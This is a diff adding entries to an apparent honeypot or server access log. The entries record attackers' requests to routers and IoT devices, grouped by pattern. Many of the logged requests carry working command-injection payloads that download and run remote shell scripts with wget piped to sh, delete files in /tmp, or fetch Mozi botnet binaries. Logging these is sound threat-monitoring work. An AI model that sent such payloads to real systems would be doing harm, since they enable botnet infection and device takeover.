@@ -51,6 +51,8 @@
 64.225.9.170 - - [15/Jul/2025 00:12:51] "GET /systembc/password.php HTTP/1.1" 200 -
 157.230.130.80 - - [16/Jul/2025 04:34:25] "GET /systembc/password.php HTTP/1.1" 200 -
 68.183.53.31 - - [17/Jul/2025 07:58:59] "GET /systembc/password.php HTTP/1.1" 200 -
+24.199.123.124 - - [19/Aug/2025 23:56:44] "GET /systembc/password.php HTTP/1.1" 200 -
+159.89.129.98 - - [25/Aug/2025 08:02:14] "GET /systembc/password.php HTTP/1.1" 200 -
 
 --wget
 87.121.84.34 - - [13/Jun/2025 15:29:59] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(wget+http://31.59.40.187/x/tplink+-O-|sh) HTTP/1.1" 200 -
@@ -161,6 +163,23 @@
 87.121.84.34 - - [16/Jul/2025 10:03:52] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(wget+http://141.11.62.222/x/tplink+-O-|sh) HTTP/1.1" 200 -
 8.219.103.247 - - [17/Jul/2025 02:32:29] code 400, message Bad request syntax ('GET /shell?cd+/tmp;rm+-rf+*;wget+ scamanje.stresserit.pro/jaws;sh+/tmp/jaws HTTP/1.1')
 8.219.103.247 - - [17/Jul/2025 02:32:29] "GET /shell?cd+/tmp;rm+-rf+*;wget+ scamanje.stresserit.pro/jaws;sh+/tmp/jaws HTTP/1.1" 400 -
+45.156.87.165 - - [19/Aug/2025 02:21:15] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=%60wget%20-qO-%20http%3A%2F%2F74.194.191.52%2Frondo.zqq.sh%7Csh%60 HTTP/1.1" 200 -
+45.156.87.165 - - [19/Aug/2025 03:16:03] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=%60wget%20-qO-%20http%3A%2F%2F74.194.191.52%2Frondo.zqq.sh%7Csh%60 HTTP/1.1" 200 -
+104.239.177.48 - - [19/Aug/2025 04:57:25] code 400, message Bad request syntax ('GET /shell?cd+/tmp;rm+-rf+*;wget+ 213.209.150.159/jaws;sh+/tmp/jaws HTTP/1.1')
+104.239.177.48 - - [19/Aug/2025 04:57:25] "GET /shell?cd+/tmp;rm+-rf+*;wget+ 213.209.150.159/jaws;sh+/tmp/jaws HTTP/1.1" 400 -
+45.156.87.165 - - [19/Aug/2025 23:15:13] "GET /cgi-bin/luci/er/reboot_link?link=%27%60wget%20-qO-%20http%3A%2F%2F74.194.191.52%2Frondo.hqf.sh%7Csh%60%27 HTTP/1.1" 200 -
+45.156.87.165 - - [20/Aug/2025 00:33:26] "GET /cgi-bin/luci/er/vlanTag?vlan_tag=%27%60wget%20-qO-%20http%3A%2F%2F74.194.191.52%2Frondo.hqf.sh%7Csh%60%27 HTTP/1.1" 200 -
+87.121.84.42 - - [20/Aug/2025 22:17:38] "GET /device.rsp?cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=cd%2520%252Ftmp%253Bwget%2520http%253A%252F%252F141.98.10.30%252Fwget.sh%2520-O%2520-%2520%257Csh&opt=sys HTTP/1.1" 200 -
+87.121.84.42 - - [20/Aug/2025 22:38:26] "GET /device.rsp?cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=cd%2520%252Ftmp%253Bwget%2520http%253A%252F%252F141.98.10.30%252Fwget.sh%2520-O%2520-%2520%257Csh&opt=sys HTTP/1.1" 200 -
+45.156.87.165 - - [22/Aug/2025 02:19:55] "GET /cgi-bin/script?system%20wget%20-qO-%20http%3A%2F%2F74.194.191.52%2Frondo.epn.sh%7Csh%3B HTTP/1.1" 200 -
+8.133.255.12 - - [22/Aug/2025 04:02:28] code 400, message Bad request syntax ('GET /shell?cd+/tmp;rm+-rf+*;wget+ 213.209.150.159/jaws;sh+/tmp/jaws HTTP/1.1')
+8.133.255.12 - - [22/Aug/2025 04:02:28] "GET /shell?cd+/tmp;rm+-rf+*;wget+ 213.209.150.159/jaws;sh+/tmp/jaws HTTP/1.1" 400 -
+197.60.167.5 - - [22/Aug/2025 14:39:23] code 400, message Bad request syntax ('GET /shell?cd+/tmp;rm+-rf+*;wget+ 213.209.150.159/jaws;sh+/tmp/jaws HTTP/1.1')
+197.60.167.5 - - [22/Aug/2025 14:39:23] "GET /shell?cd+/tmp;rm+-rf+*;wget+ 213.209.150.159/jaws;sh+/tmp/jaws HTTP/1.1" 400 -
+45.156.87.165 - - [22/Aug/2025 23:51:17] "GET /goform/SystemCommand?command=busybox%20wget%20-qO-%20http%3A%2F%2F74.194.191.52%2Frondo.qyz.sh%7Csh HTTP/1.1" 200 -
+45.156.87.165 - - [23/Aug/2025 15:25:47] "GET /proxy.cgi?chk&url=%3Bwget%20-qO-%20http%3A%2F%2F74.194.191.52%2Frondo.hsg.sh%7Csh%3B HTTP/1.1" 200 -
+59.91.172.127 - - [24/Aug/2025 04:17:46] code 400, message Bad HTTP/0.9 request type ('27;wget%20http://%s:%d/Mozi.m%20-O%20->%20/tmp/Mozi.m;chmod%20777%20/tmp/Mozi.m;/tmp/Mozi.m%20dlink.mips%27$')
+59.91.172.127 - - [24/Aug/2025 04:17:46] "27;wget%20http://%s:%d/Mozi.m%20-O%20->%20/tmp/Mozi.m;chmod%20777%20/tmp/Mozi.m;/tmp/Mozi.m%20dlink.mips%27$ HTTP/1.0" 400 -
 
 --luci/.stok=/
 87.121.84.34 - - [13/Jun/2025 15:29:59] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(wget+http://31.59.40.187/x/tplink+-O-|sh) HTTP/1.1" 200 -
@@ -375,5 +394,7 @@
 89.42.231.140 - - [16/Jul/2025 11:15:34] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 200 -
 89.42.231.140 - - [16/Jul/2025 12:41:43] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 200 -
 149.50.96.5 - - [17/Jul/2025 08:09:04] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 200 -
+45.156.87.165 - - [19/Aug/2025 02:21:15] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=%60wget%20-qO-%20http%3A%2F%2F74.194.191.52%2Frondo.zqq.sh%7Csh%60 HTTP/1.1" 200 -
+45.156.87.165 - - [19/Aug/2025 03:16:03] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=%60wget%20-qO-%20http%3A%2F%2F74.194.191.52%2Frondo.zqq.sh%7Csh%60 HTTP/1.1" 200 -
 149.50.96.5 - - [21/Jul/2025 09:27:33] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 200 -
 
